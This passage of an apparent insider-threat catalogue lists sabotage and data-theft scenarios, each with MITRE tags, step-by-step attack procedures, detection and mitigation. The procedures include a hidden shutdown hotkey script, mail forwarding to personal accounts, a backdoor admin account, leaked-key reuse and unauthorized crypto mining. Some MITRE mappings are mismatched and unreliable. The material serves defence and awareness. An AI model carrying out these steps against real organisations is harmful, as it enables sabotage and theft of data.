- **Tools**: AutoHotKey, Windows Settings
- **Scenario**: Employee configures keyboard shortcuts to dangerous commands like shutdown.
- **Attack Steps**: Step 1: Install AutoHotKey and write a script like ^q::shutdown -s -t 10. Step 2: This will make Ctrl+Q shut down the PC. Step 3: Hide the script in startup folder. Step 4: Victim unknowingly presses it and loses unsaved work. Step 5: IT team wastes time finding the cause.
- **Detection**: Check keyboard shortcut mappings
- **Solution**: Disable local scripting rights
- **Tags**: GUI, scripts, shortcuts

## Deliberate File Renaming

- **Attack Type**: Operational Sabotage
- **Target**: Office Files
- **Vulnerability**: Lack of file access tracking
- **MITRE**: T1565.001 (Stored Data Manipulation)
- **Impact**: Broken workflows
- **Tools**: File Explorer, Excel
- **Scenario**: Employee renames files subtly to break references in programs/spreadsheets.
- **Attack Steps**: Step 1: Open folder containing project or linked data files. Step 2: Add or change a single letter in the file name (e.g., report_final.xlsx → report_finaI.xlsx). Step 3: Linked documents or programs using file paths break. Step 4: Users waste hours debugging links. Step 5: IT cannot easily trace because files "exist".
- **Detection**: File access monitoring
- **Solution**: Implement naming locks & access control
- **Tags**: filename, sabotage, silent

## Printer Ink Drain

- **Attack Type**: Physical Resource Denial
- **Target**: Printer
- **Vulnerability**: No print usage limit
- **MITRE**: T1499 (Endpoint DoS)
- **Impact**: Resource exhaustion
- **Tools**: Photoshop, Word, Color PDFs
- **Scenario**: Staff uses full-color pages to quickly drain all office printer ink.
- **Attack Steps**: Step 1: Create a document with full black or color-filled pages. Step 2: Send 100–200 print jobs using “Best Quality” mode. Step 3: Do this in batches to avoid suspicion. Step 4: Within days, printer ink is gone, halting operations. Step 5: Company has to reorder expensive ink early.
- **Detection**: Monitor printer usage logs
- **Solution**: Set printing quotas per user
- **Tags**: print, waste, physical sabotage

## Shared Drive Fill-Up

- **Attack Type**: Storage Denial
- **Target**: Shared Drive
- **Vulnerability**: No storage quota or alert system
- **MITRE**: T1499.004 (Disk DoS)
- **Impact**: System storage denial
- **Tools**: Dummy File Generators, .iso files
- **Scenario**: Employee fills shared drive with large dummy files causing "drive full" errors.
- **Attack Steps**: Step 1: Create large dummy files (e.g., 5GB .iso images or videos). Step 2: Copy them into the shared folder repeatedly. Step 3: Watch for warning like “drive full”. Step 4: Resulting in others being unable to save or upload work. Step 5: Delete files quickly before caught.
- **Detection**: Storage quota monitoring
- **Solution**: Auto cleanup tools and alerts
- **Tags**: shared storage, file abuse

## Network Loop Plug

- **Attack Type**: Switch Crash
- **Target**: Network Switch
- **Vulnerability**: No STP protocol enabled
- **MITRE**: T1499.003 (Network DoS)
- **Impact**: Network failure
- **Tools**: Ethernet cable
- **Scenario**: Employee connects both ends of a LAN cable into the same switch causing broadcast storms.
- **Attack Steps**: Step 1: Go to network room or access panel. Step 2: Take a single LAN cable and plug both ends into two different ports of the same switch. Step 3: The switch becomes overloaded due to looping packets. Step 4: Network slows or crashes. Step 5: Remove the cable quietly after disruption.
- **Detection**: Port monitoring tools
- **Solution**: Enable Spanning Tree Protocol
- **Tags**: physical, cable loop, broadcast storm

## Background Audio Sabotage

- **Attack Type**: Acoustic Sabotage
- **Target**: Office Space
- **Vulnerability**: No sound policy or checks
- **MITRE**: Psychological (non-MITRE)
- **Impact**: Psychological strain
- **Tools**: Audio Player, Loop App
- **Scenario**: Worker plays faint disturbing noises in office background to lower productivity.
- **Attack Steps**: Step 1: Prepare low-volume sounds like buzzing, ticking, baby crying. Step 2: Load on a loop using audio player hidden under desk. Step 3: Keep volume just high enough to disturb but not locate. Step 4: Staff report headaches, loss of focus. Step 5: Device is hidden inside bag or drawer.
- **Detection**: Sound checks, surveillance
- **Solution**: Restrict personal audio devices
- **Tags**: mental sabotage, audio

## Fake System Update Screen

- **Attack Type**: Visual Denial
- **Target**: Workstation
- **Vulnerability**: No kiosk restrictions
- **MITRE**: T1491 (Defacement)
- **Impact**: User inaction, downtime
- **Tools**: Web-based Fake Update Screens
- **Scenario**: Person overlays a fullscreen fake "Windows Update" screen that never finishes.
- **Attack Steps**: Step 1: Visit a site like fakeupdate.net or use a local HTML page that shows an update screen. Step 2: Open the fake screen in fullscreen mode. Step 3: Lock the keyboard/mouse or leave it unattended. Step 4: Staff thinks PC is updating and avoids using it. Step 5: Entire day is wasted while the PC is idle.
- **Detection**: Check for stuck updates, screens
- **Solution**: Limit browser fullscreen use
- **Tags**: fake ui, user trick, delay

## Intentional Miswiring of Devices

- **Attack Type**: Hardware Misconfiguration
- **Target**: Desktops, Laptops
- **Vulnerability**: No cable color coding or port lock
- **MITRE**: Physical Sabotage (Non-MITRE)
- **Impact**: Hardware malfunction
- **Tools**: Power Cables, LAN Cables
- **Scenario**: Staff intentionally connects power cables or LAN ports incorrectly to cause device malfunction.
- **Attack Steps**: Step 1: Wait until closing hours or when no one is watching. Step 2: Swap the power cable of a monitor with another voltage device, or connect LAN cable to the wrong port. Step 3: Device fails to boot or loses network. Step 4: User thinks device is broken, reports to IT.
- **Detection**: Manual inspection, port testing
- **Solution**: Label and lock ports/cables
- **Tags**: wiring, sabotage, low-tech

## Remote Desktop Lockout

- **Attack Type**: User Lockout Sabotage
- **Target**: Remote Systems
- **Vulnerability**: No session timeout policies
- **MITRE**: T1531 (Account Access Removal)
- **Impact**: Work interruption
- **Tools**: RDP or TeamViewer
- **Scenario**: Employee logs into remote desktop systems and locks them continuously, preventing others from working.
- **Attack Steps**: Step 1: Get IP or session info for shared RDP system. Step 2: Log in remotely and press Windows + L to lock session. Step 3: Disconnect without logging out. Step 4: Repeat often to disrupt remote workers. Step 5: Team gets locked out constantly and can’t work.
- **Detection**: Session log analysis
- **Solution**: Use RDP timeout and force logout
- **Tags**: rdp, remote lock, access abuse

## Shared Spreadsheet Corruption

- **Attack Type**: File Corruption
- **Target**: Office Docs
- **Vulnerability**: No formula audit
- **MITRE**: T1565.001 (Stored Data Manipulation)
- **Impact**: Inaccurate reports, confusion
- **Tools**: Microsoft Excel
- **Scenario**: Insider adds hidden formula errors to shared Excel files that break totals and charts.
- **Attack Steps**: Step 1: Open shared Excel file. Step 2: Edit cells with formulas and add invisible errors like dividing by zero. Step 3: Hide the column or use white font to mask changes. Step 4: Save and exit. Step 5: Users later see broken graphs or wrong totals but can’t find the cause.
- **Detection**: Spreadsheet audit tools
- **Solution**: Protect cells and enable versioning
- **Tags**: excel, logic corruption

## Intentional False Complaints

- **Attack Type**: Human Process Disruption
- **Target**: Ticketing System
- **Vulnerability**: No complaint validation
- **MITRE**: Social Engineering
- **Impact**: Waste of manpower, delays
- **Tools**: Email or Ticketing System
- **Scenario**: Employee floods HR and IT with false tickets about systems being broken.
- **Attack Steps**: Step 1: Use office email to send multiple tickets like “VPN not working” or “file corrupted” with fake details. Step 2: Use different machines or times to avoid pattern detection. Step 3: IT spends hours checking and fixing what’s not broken. Step 4: Team productivity suffers while chasing false alerts.
- **Detection**: Cross-check ticket origin and pattern
- **Solution**: Flag high-volume users, verify tickets
- **Tags**: hr sabotage, spam tickets

## Force Updates Mid-Day

- **Attack Type**: System Availability Disruption
- **Target**: Windows PC
- **Vulnerability**: Local admin rights
- **MITRE**: T1499.001 (OS Resource Exhaustion)
- **Impact**: Downtime during work
- **Tools**: Windows Update
- **Scenario**: Employee forces OS updates during peak work hours, rendering systems unusable temporarily.
- **Attack Steps**: Step 1: Open Windows Settings → Update & Security. Step 2: Click “Check for updates” and install pending ones. Step 3: Choose “Restart Now” during peak usage. Step 4: PC reboots and applies updates for 15–30 minutes. Step 5: Repeat on other machines.
- **Detection**: Check update logs
- **Solution**: Limit update permissions
- **Tags**: update misuse, timing, delay

## Password Reset Bomb

- **Attack Type**: Credential Lockout
- **Target**: Internal Systems
- **Vulnerability**: Poor RBAC and audit
- **MITRE**: T1531 (Account Access Removal)
- **Impact**: Lockout, frustration
- **Tools**: Internal Web Portal, HRMS
- **Scenario**: Employee resets passwords for multiple coworkers and doesn’t share them.
- **Attack Steps**: Step 1: Log into employee management system with permissions. Step 2: Initiate password reset for multiple users. Step 3: Set new passwords and don’t inform them. Step 4: They get locked out and can't access tools. Step 5: IT spends hours unlocking accounts.
- **Detection**: Account reset logs
- **Solution**: Role separation, audit trail
- **Tags**: credential misuse, insider

## Email Rule Auto-Delete

- **Attack Type**: Stealth Communication Disruption
- **Target**: Email
- **Vulnerability**: No email rule logging
- **MITRE**: T1114.003 (Email Collection)
- **Impact**: Communication breakdown
- **Tools**: Outlook Rules
- **Scenario**: Insider creates inbox rules that delete or move incoming emails silently.
- **Attack Steps**: Step 1: Open Outlook and go to Rules → Manage Rules & Alerts. Step 2: Add rule: “If email is from boss, move to Trash/Spam”. Step 3: Check "run this rule on messages already in inbox". Step 4: Email goes unnoticed by user. Step 5: Employee misses deadlines or tasks.
- **Detection**: Rule change audits
- **Solution**: Disable custom rules
- **Tags**: email, rules, stealth

## Browser Bookmark Poisoning

- **Attack Type**: Misleading Navigation
- **Target**: Browser
- **Vulnerability**: No bookmark protection
- **MITRE**: T1556.004 (Application Logon Hijacking)
- **Impact**: Confusion or credential theft
- **Tools**: Browser (Chrome, Firefox)
- **Scenario**: Employee changes coworkers’ browser bookmarks to wrong or phishing versions of tools.
- **Attack Steps**: Step 1: On target PC, open Chrome bookmarks. Step 2: Find link to internal dashboard or portal. Step 3: Replace it with a broken or fake link. Step 4: User clicks wrong link and wastes time or gets frustrated. Step 5: If fake, might enter credentials too.
- **Detection**: Manual inspection
- **Solution**: Disable bookmark editing or lock profiles
- **Tags**: chrome, misdirection, access

## Intentional Proxy Misconfig

- **Attack Type**: Network Access Denial
- **Target**: Workstations
- **Vulnerability**: Local config access
- **MITRE**: T1565.002 (System Settings Modification)
- **Impact**: Network loss
- **Tools**: Windows Internet Settings
- **Scenario**: Insider sets wrong proxy settings on PCs to block internet access.
- **Attack Steps**: Step 1: Open “Internet Options” → Connections → LAN Settings. Step 2: Check “Use a proxy server” and enter a fake IP. Step 3: Apply and close. Step 4: Internet stops working; user sees “Page Not Found”. Step 5: IT struggles to find root cause.
- **Detection**: Check proxy registry entries
- **Solution**: Lock proxy settings via group policy
- **Tags**: network sabotage, proxy

## Meeting Room Booking Hoarding

- **Attack Type**: Operational Sabotage
- **Target**: Collaboration Tools
- **Vulnerability**: No approval for room booking
- **MITRE**: T1530 (Data from Cloud Storage Object)
- **Impact**: Workflow disruption
- **Tools**: Outlook, Google Calendar
- **Scenario**: Insider pre-books all meeting rooms to block others from scheduling.
- **Attack Steps**: Step 1: Open calendar or booking portal. Step 2: Book all meeting rooms during peak hours for fake meetings. Step 3: Use vague titles like “Discussion” or “Internal”. Step 4: Leave rooms empty while others are forced to delay work. Step 5: Repeat weekly.
- **Detection**: Meeting room usage logs
- **Solution**: Use approvals for room bookings
- **Tags**: calendar, abuse, meeting block

## Fake Power Button Sticker

- **Attack Type**: Physical Obstruction
- **Target**: Workstation
- **Vulnerability**: Lack of visual inspection
- **MITRE**: Physical Sabotage (non-MITRE)
- **Impact**: Delays and confusion
- **Tools**: Printed Stickers, Transparent Tape
- **Scenario**: Insider places a sticker over the PC power button, causing confusion and fake “hardware failure”.
- **Attack Steps**: Step 1: Print a fake "power" label and cover actual power button with black dot or fake label. Step 2: Apply clear tape to hide it. Step 3: Users try pressing wrong spot and think system is broken. Step 4: Waste time calling IT. Step 5: Insider quietly removes label after disruption.
- **Detection**: Manual check
- **Solution**: Encourage visual device inspection
- **Tags**: prank, low-tech, denial

## Malicious Browser Extension

- **Attack Type**: Software-Level Denial
- **Target**: Browser
- **Vulnerability**: No browser extension control
- **MITRE**: T1176 (Browser Extensions)
- **Impact**: Access denial, confusion
- **Tools**: Chrome Web Store, Custom Extension
- **Scenario**: Insider installs a browser extension that randomly redirects or blocks websites.
- **Attack Steps**: Step 1: Search or create a harmless-looking extension that can redirect or block pages. Step 2: Install on target user’s browser. Step 3: Configure it to randomly redirect productivity sites to error pages. Step 4: Victim thinks the sites are down. Step 5: IT wastes time diagnosing browser/network.
- **Detection**: Extension auditing
- **Solution**: Restrict extension install rights
- **Tags**: chrome, browser, access abuse

## Shared Account Confusion

- **Attack Type**: Multi-User Access Conflict
- **Target**: Shared Cloud
- **Vulnerability**: Poor access segregation
- **MITRE**: T1087.001 (Local Account Abuse)
- **Impact**: Collaboration breakdown
- **Tools**: Shared Account, Cloud Drive
- **Scenario**: Employee secretly logs into shared account while others use it, overwriting files or creating version conflicts.
- **Attack Steps**: Step 1: Wait until someone is editing a document in a shared account (like Google Docs). Step 2: Log in and make minor, confusing edits. Step 3: Remove bullet points, change colors, insert typos. Step 4: Save and log out. Step 5: Coworker believes system is broken or data is corrupted.
- **Detection**: File version tracking
- **Solution**: Remove shared accounts, use RBAC
- **Tags**: google docs, conflict, insider

## Intentional Wrong File Format

- **Attack Type**: Operational Sabotage
- **Target**: Document Workflow
- **Vulnerability**: Legacy format support
- **MITRE**: T1565 (Data Manipulation)
- **Impact**: File errors, user frustration
- **Tools**: Excel 97-2003, Word 2003
- **Scenario**: Employee saves critical reports in outdated formats that crash modern tools.
- **Attack Steps**: Step 1: Prepare report or file in current version of Excel. Step 2: Save As → Choose "Excel 97-2003 Workbook (*.xls)". Step 3: Email or upload the file. Step 4: User opens it, crashes or sees formatting errors. Step 5: Repeated use causes mistrust in system.
- **Detection**: Format validation scripts
- **Solution**: Enforce format standards
- **Tags**: file format, office, legacy

## Monitor Display Misconfig

- **Attack Type**: Visual Denial
- **Target**: Workstation Monitor
- **Vulnerability**: No config restrictions
- **MITRE**: T1495 (Firmware Corruption - Display Related)
- **Impact**: Panic, wasted time
- **Tools**: Monitor Menu, Display Settings
- **Scenario**: Employee adjusts monitor resolution and contrast to unreadable settings, making the screen seem broken.
- **Attack Steps**: Step 1: Press buttons on monitor to reduce brightness to 0. Step 2: Set contrast or gamma high/low. Step 3: In OS display settings, change resolution to lowest. Step 4: Leave before user returns. Step 5: User panics, thinks monitor is damaged.
- **Detection**: Manual screen inspection
- **Solution**: Lock monitor buttons, preset display config
- **Tags**: display, sabotage, visual

## Intentional Firewall Blocking

- **Attack Type**: Network Resource Denial
- **Target**: Workstation
- **Vulnerability**: Local firewall access
- **MITRE**: T1562.004 (Disable or Modify System Firewall)
- **Impact**: Loss of access, delay
- **Tools**: Windows Defender Firewall
- **Scenario**: Insider uses system firewall to block critical IPs or domains used by staff.
- **Attack Steps**: Step 1: Go to Control Panel → Firewall → Advanced Settings. Step 2: Create a new outbound rule to block IPs or domain names (e.g., mail.company.com). Step 3: Apply to all profiles. Step 4: Email or file sharing stops working for user. Step 5: IT misdiagnoses as DNS or server issue.
- **Detection**: Firewall rule audit
- **Solution**: Restrict local firewall rule creation
- **Tags**: firewall, config abuse, sabotage

## Deliberate Email Misforward

- **Attack Type**: Communication Interruption
- **Target**: Email System
- **Vulnerability**: Lack of email rule audits
- **MITRE**: T1114 (Email Collection/Abuse)
- **Impact**: Lost communication
- **Tools**: Outlook Rules
- **Scenario**: Employee sets Outlook rules to forward all emails to a random coworker.
- **Attack Steps**: Step 1: Open Outlook → Rules and Alerts. Step 2: Create rule: “Forward all emails to [coworker@example.com]”. Step 3: Save and hide rule. Step 4: Victim misses all messages while other user gets flooded. Step 5: Blame IT for mail server issue.
- **Detection**: Rule inspection, mail header tracing
- **Solution**: Disable unauthorized mail forwarding
- **Tags**: email, rule abuse, insider

## Clock Skew Manipulation

- **Attack Type**: Time-Based Sabotage
- **Target**: Workstation
- **Vulnerability**: Local time config rights
- **MITRE**: T1070.006 (Time Stomp)
- **Impact**: Scheduled task failure
- **Tools**: Windows Clock Settings
- **Scenario**: Insider changes system time to cause scheduling failures, expired tokens, and missed backups.
- **Attack Steps**: Step 1: Go to “Date & Time Settings” in Windows. Step 2: Turn off auto sync. Step 3: Set time back or forward by several hours. Step 4: Scheduled tasks fail or cause token expiry. Step 5: Team reports failed login or backup.
- **Detection**: System time check scripts
- **Solution**: Lock time sync settings via GPO
- **Tags**: clock, time shift, scheduler

## Randomized Folder Renaming

- **Attack Type**: Data Obfuscation
- **Target**: Shared Folder
- **Vulnerability**: No folder renaming restrictions
- **MITRE**: T1565.001 (Stored Data Manipulation)
- **Impact**: Workflow disruption
- **Tools**: File Explorer
- **Scenario**: Employee renames key folders with random strings to confuse users and scripts.
- **Attack Steps**: Step 1: Navigate to shared folders used by team or apps. Step 2: Rename folder ProjectFiles → P2o3jF!_tmp or similar. Step 3: Breaks shortcuts, batch jobs, and human searchability. Step 4: Change back intermittently to confuse detection.
- **Detection**: Monitor rename logs
- **Solution**: Folder name locks or alerts
- **Tags**: folders, chaos, naming abuse

## Disrupting Video Meetings

- **Attack Type**: Live Session Denial
- **Target**: Online Meeting Platforms
- **Vulnerability**: Too many people with host rights
- **MITRE**: T1219 (Remote Access Software Misuse)
- **Impact**: Meeting failure, delays
- **Tools**: Zoom, Teams, Google Meet
- **Scenario**: Insider keeps muting others, kicking them out, or playing loud sounds during virtual meetings.
- **Attack Steps**: Step 1: Join virtual meeting where you have co-host or organizer access. Step 2: Mute speakers randomly or remove participants. Step 3: Play annoying sound effects or background noise. Step 4: Drop out and rejoin repeatedly to cause disruption.
- **Detection**: Meeting activity logs
- **Solution**: Limit host powers, remove offender quickly
- **Tags**: online, sabotage, co-host abuse

## Sharing Cloud Credentials with Outsider

- **Attack Type**: Credential Sharing
- **Target**: Cloud Storage
- **Vulnerability**: Weak credential handling
- **MITRE**: T1078.004 - Valid Accounts: Cloud Accounts
- **Impact**: Data leakage, compliance violation
- **Tools**: No tool needed
- **Scenario**: An employee shares AWS IAM credentials with a third-party friend to extract sensitive files.
- **Attack Steps**: Step 1: Employee logs in to their cloud account (e.g., AWS Console).Step 2: Navigates to IAM section to copy their Access Key ID and Secret Key.Step 3: Sends the credentials to a friend via email or messaging app.Step 4: Friend uses those credentials to log in via AWS CLI.Step 5: Downloads S3 bucket files containing confidential data.
- **Detection**: Anomaly in cloud login from unknown location, excessive S3 reads
- **Solution**: Enable CloudTrail logs, enforce MFA, use temporary credentials
- **Tags**: insider, aws, s3, credential, cloud

## Malicious File Upload in Shared Drive

- **Attack Type**: Data Corruption
- **Target**: Shared Cloud Drive
- **Vulnerability**: Lack of file scanning
- **MITRE**: T1566.001 - Phishing: Spearphishing Attachment
- **Impact**: Credential theft, data corruption
- **Tools**: Malicious macro-infected Excel file
- **Scenario**: A user uploads malicious Excel macros to a company’s shared OneDrive, affecting other users.
- **Attack Steps**: Step 1: Insider creates or downloads an Excel file with malicious macros (e.g., download macro virus from GitHub for simulation).Step 2: Saves the file as Monthly_Report.xlsm.Step 3: Uploads it to a team-shared folder on OneDrive.Step 4: Colleagues unknowingly open the file and enable macros.Step 5: Macro executes payload, possibly stealing browser credentials.
- **Detection**: Alerts from antivirus, OneDrive scan logs
- **Solution**: Block macros in cloud uploads, educate users, DLP policies
- **Tags**: macro, onedrive, office365, phishing

## Abuse of Snapshot in Cloud VMs

- **Attack Type**: Data Exfiltration
- **Target**: Cloud VM
- **Vulnerability**: Poor snapshot control
- **MITRE**: T1529 - System Image Capture
- **Impact**: Data theft
- **Tools**: AWS Console / Azure Portal
- **Scenario**: An admin creates a snapshot of a confidential server and downloads it to personal device.
- **Attack Steps**: Step 1: Insider logs in to AWS EC2 or Azure VM dashboard.Step 2: Navigates to the production VM used by finance.Step 3: Creates a snapshot of the disk volume.Step 4: Shares or downloads the snapshot as an image.Step 5: Mounts the disk image locally to access sensitive files.
- **Detection**: Logs show snapshot creation and download
- **Solution**: Restrict snapshot rights, monitor snapshot events
- **Tags**: ec2, snapshot, disk, cloud, vm

## Gaining Access via Forgotten Shared Link

- **Attack Type**: Lateral Access
- **Target**: Cloud Storage Link
- **Vulnerability**: Public link not revoked
- **MITRE**: T1213.003 - Data from Information Repositories: Cloud Storage
- **Impact**: Sensitive data reuse
- **Tools**: Web browser
- **Scenario**: Employee reuses a forgotten, publicly shared Google Drive link containing old client data.
- **Attack Steps**: Step 1: Insider remembers a past shared GDrive link (e.g., from emails/slack).Step 2: Opens the link in browser without login.Step 3: Downloads PDFs and spreadsheets from old project folders.Step 4: Reuses client contacts or resells data.
- **Detection**: Monitor link access logs in Google Workspace
- **Solution**: Expire public links, automate link review
- **Tags**: gdrive, google workspace, sharelink

## Creating Hidden Cloud Accounts

- **Attack Type**: Privilege Abuse
- **Target**: Cloud Identity
- **Vulnerability**: Misuse of admin privilege
- **MITRE**: T1098.003 - Account Manipulation: Additional Cloud Credentials
- **Impact**: Persistent backdoor
- **Tools**: Azure Portal
- **Scenario**: An IT admin secretly creates a secondary admin account in Azure AD before resignation.
- **Attack Steps**: Step 1: Insider logs into Azure Active Directory (Azure AD).Step 2: Creates a new user: hidden-admin@company.com.Step 3: Assigns Global Administrator role.Step 4: Leaves no activity logs by using incognito or audit-exempt method.Step 5: After resigning, uses that account remotely to access systems.
- **Detection**: Azure AD audit log, identity alerts
- **Solution**: Use role-based access, enable Just-In-Time access
- **Tags**: azuread, backdoor, admin abuse

## Forwarding Work Emails to Personal Account

- **Attack Type**: Data Leakage
- **Target**: Cloud Email
- **Vulnerability**: Lack of DLP rules
- **MITRE**: T1114 - Email Collection
- **Impact**: IP/data theft
- **Tools**: Email client (e.g., Outlook, Gmail)
- **Scenario**: Employee sets an auto-forward rule to secretly send work emails to personal Gmail.
- **Attack Steps**: Step 1: Employee logs into corporate email (e.g., Outlook 365).Step 2: Navigates to mail settings > Rules.Step 3: Creates a rule: "Forward all incoming emails to personal@gmail.com".Step 4: Emails with attachments and sensitive info now go to personal inbox unnoticed.
- **Detection**: Email audit logs, DLP system alerts
- **Solution**: Disable auto-forwarding, apply DLP filters
- **Tags**: email, forward, outlook, o365

## Misusing Cloud Print Services

- **Attack Type**: Unauthorized Data Transfer
- **Target**: Google Workspace
- **Vulnerability**: Insecure service configuration
- **MITRE**: T1530 - Data from Cloud Storage
- **Impact**: Untraceable data exfiltration
- **Tools**: Google Cloud Print (deprecated, example)
- **Scenario**: Insider configures Google Cloud Print to print confidential files to personal printer at home.
- **Attack Steps**: Step 1: Insider connects corporate Google account to personal printer via cloud print.Step 2: Opens internal documents from Google Docs or PDF in browser.Step 3: Clicks Print > selects home printer.Step 4: Sensitive files are printed outside organization.
- **Detection**: Print logs, browser history
- **Solution**: Disable remote printing, use secure printing policies
- **Tags**: cloudprint, exfiltration, gworkspace

## Exploiting Unused Cloud API Keys

- **Attack Type**: Unauthorized API Use
- **Target**: Cloud API
- **Vulnerability**: Poor key hygiene
- **MITRE**: T1552.001 - Credentials in Files
- **Impact**: Cloud resource compromise
- **Tools**: Postman, AWS CLI
- **Scenario**: Former developer finds old unused AWS API key in email and uses it to access dev server.
- **Attack Steps**: Step 1: Insider searches old emails or backups for .env files.Step 2: Finds AWS_ACCESS_KEY and AWS_SECRET_KEY.Step 3: Installs AWS CLI or uses Postman.Step 4: Uses the key to list EC2, read S3 buckets, or invoke Lambda functions.Step 5: Extracts sensitive test data.
- **Detection**: CloudTrail logs, API call tracking
- **Solution**: Rotate keys, expire unused credentials
- **Tags**: api, keyleak, credential, aws

## Insider Abuse of Chatbots or Slack Apps

- **Attack Type**: Info Gathering
- **Target**: Slack Integration
- **Vulnerability**: Excess bot permissions
- **MITRE**: T1213.002 - Data from Information Repositories: SharePoint or CMS
- **Impact**: Policy breach
- **Tools**: Slack + internal bot
- **Scenario**: Employee queries company Slack bot (integrated with Confluence) to pull sensitive policy docs.
- **Attack Steps**: Step 1: Insider joins company Slack.Step 2: Privately messages bot with prompts like: “Get all HR salary sheets”.Step 3: Bot fetches Confluence pages via internal API.Step 4: Insider screenshots or copies info.Step 5: Leaks documents externally.
- **Detection**: Chatbot logs, unusual bot queries
- **Solution**: Restrict bot scope, add DLP to bot output
- **Tags**: slack, bot, infoleak, hrdata

## Abusing Shared Notebooks in OneNote

- **Attack Type**: Hidden Info Leak
- **Target**: Office365 OneNote
- **Vulnerability**: Lack of embedded file scanning
- **MITRE**: T1027 - Obfuscated Files or Information
- **Impact**: Info leak via hidden data
- **Tools**: OneNote Online
- **Scenario**: Employee embeds secret files in shared OneNote sections used by remote team.
- **Attack Steps**: Step 1: Insider uploads a .zip file renamed as .jpg or embeds inside text in shared OneNote.Step 2: Notes appear normal to viewers.Step 3: Collaborators download embedded object assuming it's part of task.Step 4: File opens revealing confidential IP or passwords.Step 5: Third party gains access.
- **Detection**: O365 logs, AV scan on OneNote downloads
- **Solution**: Scan embedded files, disable object upload
- **Tags**: onenote, hiddenfile, office365

## Setting Up Personal Cloud Sync on Work PC

- **Attack Type**: Sync Misuse
- **Target**: Work PC & Cloud
- **Vulnerability**: No endpoint monitoring
- **MITRE**: T1537 - Transfer Data to Cloud Account
- **Impact**: Covert data exfiltration
- **Tools**: Google Drive Sync / Dropbox Client
- **Scenario**: Employee syncs company folders to personal Google Drive using Backup & Sync tool.
- **Attack Steps**: Step 1: Installs Google Drive Backup & Sync on office PC.Step 2: Chooses sync folder: C:\Users\Admin\Desktop\CompanyDocs.Step 3: Logs in with personal Gmail.Step 4: All files get auto-uploaded to personal cloud.Step 5: Insider can access them from home.
- **Detection**: Monitor sync clients, bandwidth alerts
- **Solution**: Block unauthorized sync clients
- **Tags**: gdrive, sync, endpoint, insider

## Reverting Git Commits to Restore Removed Secrets

- **Attack Type**: Code Secret Recovery
- **Target**: Git Repos
- **Vulnerability**: Poor commit hygiene
- **MITRE**: T1552.001 - Credentials in Files
- **Impact**: Secret reuse
- **Tools**: Git CLI / GitHub
- **Scenario**: Insider uses Git history to find removed passwords or secrets in DevOps repo.
- **Attack Steps**: Step 1: Employee clones internal repo from GitHub Enterprise.Step 2: Uses git log and git checkout <old_commit> to revert to an old version.Step 3: Finds API keys and passwords removed in later commits.Step 4: Copies secrets into notepad.Step 5: Deletes evidence.
- **Detection**: Git logs, branch change monitoring
- **Solution**: Use git-secrets, scan history for secrets
- **Tags**: git, github, secrets, devops

## Launching Unauthorized VMs for Crypto Mining

- **Attack Type**: Resource Abuse
- **Target**: Cloud Compute
- **Vulnerability**: No resource monitoring
- **MITRE**: T1496 - Resource Hijacking
- **Impact**: Financial loss
- **Tools**: AWS Console / GCP UI, mining script
- **Scenario**: Cloud admin launches hidden VM in AWS/GCP for personal crypto mining.
- **Attack Steps**: Step 1: Admin logs into AWS/GCP account.Step 2: Launches new EC2/VM instance labeled as "test-node".Step 3: Installs mining software (e.g., XMRig).Step 4: Connects it to crypto pool.Step 5: Earns crypto while company pays for compute.
- **Detection**: Billing anomalies, high CPU usage
- **Solution**: Quotas, usage alerts, tag tracking
- **Tags**: crypto, ec2, mining, abuse

## Editing Shared Google Sheets for Sabotage

- **Attack Type**: Data Tampering
- **Target**: Google Workspace
- **Vulnerability**: No version control awareness
- **MITRE**: T1565.002 - Stored Data Manipulation
- **Impact**: Financial misreporting
- **Tools**: Google Sheets
- **Scenario**: Employee alters formulas and data in shared financial spreadsheets to mislead team.
- **Attack Steps**: Step 1: Insider opens shared Google Sheet.Step 2: Modifies formulas to calculate wrong totals (e.g., change SUM to subtract).Step 3: Changes cell formatting to hide changes (white text on white cell).Step 4: Team reports wrong figures.Step 5: Insider covers tracks by reverting to prior version later.
- **Detection**: Sheet change logs
- **Solution**: Enable formula change alerts, educate team
- **Tags**: gsheet, sabotage, spreadsheet

## Insider Using ChatGPT for Prompt Injection of Docs

- **Attack Type**: Unauthorized Document Generation
- **Target**: AI Tools + Cloud Docs
- **Vulnerability**: AI misuse loophole
- **MITRE**: T1606 - Forge Web Content
- **Impact**: Knowledge/IP leakage
- **Tools**: ChatGPT, Bard, Claude
- **Scenario**: Insider uses AI tools like ChatGPT to regenerate confidential content into paraphrased versions.
- **Attack Steps**: Step 1: Insider copies internal document (e.g., strategy report).Step 2: Opens ChatGPT or similar tool.Step 3: Pastes content with prompt: “Rephrase this for external presentation”.Step 4: Gets paraphrased version without watermark.Step 5: Sends it to unauthorized contact or uses it to mislead others.
- **Detection**: Browser history, ChatGPT export logs (if logged)
- **Solution**: AI DLP filters, train for misuse detection
- **Tags**: ai, llm, rephrase, ipleak

## Stealing OAuth Tokens via Browser Sync

- **Attack Type**: Session Hijack
- **Target**: OAuth Tokens
- **Vulnerability**: Sync-enabled token leakage
- **MITRE**: T1550.001 - Use Alternate Authentication Material
- **Impact**: Token/session compromise
- **Tools**: Chrome/Edge browser
- **Scenario**: Insider uses browser sync to steal OAuth tokens from a shared browser profile.
- **Attack Steps**: Step 1: Insider logs in to Chrome with corporate account.Step 2: Enables sync (bookmarks, history, passwords, cookies).Step 3: On personal laptop with same sync login, downloads synced session cookies and OAuth tokens.Step 4: Uses tokens to access apps like Slack, Jira without re-login.Step 5: Extracts project and team data.
- **Detection**: Browser sync audit logs
- **Solution**: Block sync, rotate OAuth frequently
- **Tags**: oauth, token, chrome, session

## Accessing Archived Backups in Object Storage

- **Attack Type**: Data Retrieval
- **Target**: Cloud Archive
- **Vulnerability**: Lack of archive access control
- **MITRE**: T1537 - Transfer Data to Cloud Account
- **Impact**: Exposure of forgotten records
- **Tools**: AWS Console, Azure Portal
- **Scenario**: Insider accesses old, forgotten backups in AWS Glacier or Azure Archive and restores them.
- **Attack Steps**: Step 1: Insider logs into cloud storage (e.g., AWS S3 Glacier).Step 2: Searches for cold storage archives.Step 3: Initiates restore request.Step 4: After restore completes, downloads backup containing old HR or sales records.Step 5: Stores it on USB or sends via email.
- **Detection**: Glacier logs, restore request tracking
- **Solution**: Use backup vault policies, restrict restore rights
- **Tags**: aws, archive, backup, s3

## Using API Gateway Logs to Reconstruct Business Logic

- **Attack Type**: Reconnaissance
- **Target**: Cloud API Logs
- **Vulnerability**: Overexposed logs
- **MITRE**: T1040 - Network Sniffing (via API logging)
- **Impact**: Reverse engineering API design
- **Tools**: AWS API Gateway / GCP API Logs
